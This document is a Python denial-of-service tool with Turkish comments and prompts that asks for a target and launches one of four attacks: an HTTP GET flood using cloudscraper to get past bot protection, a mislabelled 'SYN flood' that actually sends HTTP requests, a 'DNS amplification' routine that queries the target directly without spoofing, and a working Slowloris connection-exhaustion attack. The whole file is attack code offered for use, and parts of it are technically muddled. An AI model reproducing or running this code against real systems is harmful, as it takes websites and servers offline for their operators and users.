import socket
import random
import time
import cloudscraper
import threading
import concurrent.futures
import subprocess 


# Renk kodları
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

class Slowloris:
    def __init__(self, target_host, target_port, num_connections, timeout=5):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.timeout = timeout
        self.sockets = []

    def establish_connections(self):
        # Belirtilen sayıda bağlantı oluştur
        for _ in range(self.num_connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.target_host, self.target_port))
                self.sockets.append(s)
                print(f"[Başarı] Bağlanan soket sayısı: {len(self.sockets)}")
            except Exception as e:
                print(f"[Hata] Bağlantı oluşturulurken bir hata oluştu: {e}")

    def send_headers(self):
        # Oluşturulan her bağlantı üzerinden yavaşça eksik HTTP başlıkları gönder
        while True:
            for s in self.sockets:
                try:
                    # Rastgele bir URL oluştur
                    url = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(10))
                    headers = f"GET /{url} HTTP/1.1\r\n"
                    headers += f"Host: {self.target_host}\r\n"
                    headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
                    headers += "Accept-language: en-US,en,q=0.5\r\n"
                    s.sendall(headers.encode())
                    print(f"[Başarı] Başlık gönderildi - {url}")
                except Exception as e:
                    print(f"[Hata] Başlık gönderilirken bir hata oluştu: {e}")

            # Bağlantılar kapatıldığında soketleri yeniden oluştur
            self.sockets = [s for s in self.sockets if s.fileno() != -1]
            while len(self.sockets) < self.num_connections:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.timeout)
                    s.connect((self.target_host, self.target_port))
                    self.sockets.append(s)
                    print(f"[Başarı] Yeni soket oluşturuldu - Toplam soket sayısı: {len(self.sockets)}")
                except Exception as e:
                    print(f"[Hata] Yeni soket oluşturulurken bir hata oluştu: {e}")

            time.sleep(15)

    def close_connections(self):
        # Tüm bağlantıları kapat
        for s in self.sockets:
            try:
                s.close()
                print("[Başarı] Bağlantı kapatıldı")
            except Exception as e:
                print(f"[Hata] Bağlantı kapatılırken bir hata oluştu: {e}")

class DDoSAttack:
    def __init__(self, url, num_threads, num_requests_per_thread, interval_between_requests):
        self.url = url
        self.num_threads = num_threads
        self.num_requests_per_thread = num_requests_per_thread
        self.interval_between_requests = interval_between_requests

    def attack(self):
        scraper = cloudscraper.create_scraper()
        for _ in range(self.num_requests_per_thread):
            try:
                response = scraper.get(self.url)
                print(f"Saldiri başlatılıyor {self.url} - Durum kodu: {response.status_code}")
            except Exception as e:
                print(f"Bir hata oluştu: {str(e)}")
            time.sleep(self.interval_between_requests)

    def start_attack(self):
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.attack)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

class SynFloodAttack:
    def __init__(self, target_url, target_port, duration, num_threads):
        self.target_url = target_url
        self.target_port = target_port
        self.duration = duration
        self.num_threads = num_threads
        self.stop_event = threading.Event()
        self.scraper = cloudscraper.create_scraper()

    def syn_flood(self):
        while not self.stop_event.is_set():
            try:
                source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
                source_port = random.randint(1024, 65535)

                syn_packet = b"GET / HTTP/1.1\r\nHost: " + self.target_url.encode() + b"\r\n\r\n"
                response = self.scraper.get(self.target_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2)
                status_code = response.status_code

                print(f"SYN paketi gönderildi {self.target_url}:{self.target_port} - Kaynak: {source_ip}:{source_port}, Durum: {status_code}")
            except Exception as e:
                print(f"Hata: {str(e)}")

    def start_attack(self):
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.syn_flood)
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()

        for t in threads:
            t.join()

def generate_dns_query(url):
    dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    dns_query += b"\x07" + url.encode("utf-8") + b"\x00\x00\x01\x00\x01"
    return dns_query

def dns_amplification(url, attack_intensity, attack_duration):
    ip_address = socket.gethostbyname(url)
    destination_port = 53
    dns_query = generate_dns_query(url)

    with concurrent.futures.ThreadPoolExecutor() as executor:
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            futures = []
            for _ in range(attack_intensity):
                source_port = random.randint(1024, 65535)
                futures.append(executor.submit(send_dns_packet, ip_address, destination_port, dns_query, source_port))
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    status = check_target_status(ip_address)
                    if result['success']:
                        print(f"Paket gönderildi: Kaynak Port - {GREEN}{result['source_port']}{RESET}, Hedef IP - {ip_address}, Durum - {status}")
                    else:
                        print(f"Paket gönderilemedi: Kaynak Port - {RED}{result['source_port']}{RESET}, Hedef IP - {ip_address}, Durum - {status}")

def send_dns_packet(ip_address, destination_port, dns_query, source_port):
    result = {'success': False, 'source_port': source_port}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(dns_query, (ip_address, destination_port))
        result['success'] = True
    except Exception as e:
        print(f"Hata: {e}")
    return result

def check_target_status(ip_address):
    try:
        output = subprocess.check_output(["ping", "-c", "1", ip_address])
        if "1 packets transmitted, 1 received" in output.decode():
            return f"{GREEN}Başarılı (ICMP yanıtı alındı){RESET}"
        else:
            return f"{RED}Başarısız (ICMP yanıtı alınamadı){RESET}"
    except subprocess.CalledProcessError:
        return f"{RED}Başarısız (ICMP isteği gönderilemedi){RESET}"

def http_get_flood():
    url = input("Hedef URL'yi girin (örneğin https://www.example.com/): ")
    num_threads = int(input("Kaç aynı anda çalışacak saldırı teli oluşturmak istiyorsunuz? "))
    num_requests_per_thread = int(input("Her bir saldırı teli için kaç istek göndermek istiyorsunuz? "))
    interval_between_requests = float(input("Her istek arasında bekleme süresi (saniye cinsinden) girin (varsayılan: 0): ") or 0)

    ddos_attack = DDoSAttack(url, num_threads, num_requests_per_thread, interval_between_requests)
    ddos_attack.start_attack()

def syn_flood():
    target_url = input("Hedef URL'yi girin (örneğin https://www.example.com): ")
    target_port = int(input("Hedef port numarasını girin: "))
    duration = int(input("Saldırı süresini (saniye cinsinden) girin: "))
    num_threads = int(input("Kullanılacak saldırgan sayısını girin: "))

    print(f"\nHedef URL: {target_url}")
    print(f"Hedef Port: {target_port}")
    print(f"Saldırı Süresi: {duration} saniye")
    print(f"Kullanılacak Saldırgan Sayısı: {num_threads}\n")

    attack = SynFloodAttack(target_url, target_port, duration, num_threads)
    attack.start_attack()

def dns_amplification_attack():
    url = input("Hedef İp adresini girin: ")
    attack_intensity = int(input("Saldırı yoğunluğunu girin: "))
    attack_duration = int(input("Saldırı süresini saniye cinsinden girin: "))

    dns_amplification(url, attack_intensity, attack_duration)

def slowloris_attack():
    target_host = input("Hedef IP adresini girin: ")
    target_port = int(input("Hedef port numarasını girin: "))
    num_connections = int(input("Kaç adet bağlantı oluşturmak istiyorsunuz?: "))

    slowloris = Slowloris(target_host, target_port, num_connections)
    slowloris.establish_connections()
    slowloris.send_headers()

def default_case():
    print("Geçersiz seçim. Lütfen geçerli bir seçenek seçin.")

# Atack türünün seçim yeri
options = {
    1: http_get_flood,
    2: syn_flood,
    3: dns_amplification_attack,
    4: slowloris_attack
}

# Kullanıcıdan seçim yapılmasını isteniliyor
choice = int(input("Seçenekleri belirtin:\n1. Http_get_attack\n2. Syn_flood_attack\n3. Dns_amplification_attack\n4. Slowloris_attack\nLütfen seçiminizi yapın: "))

# Seçime göre doğru fonksiyonu çağır
options.get(choice, default_case)()
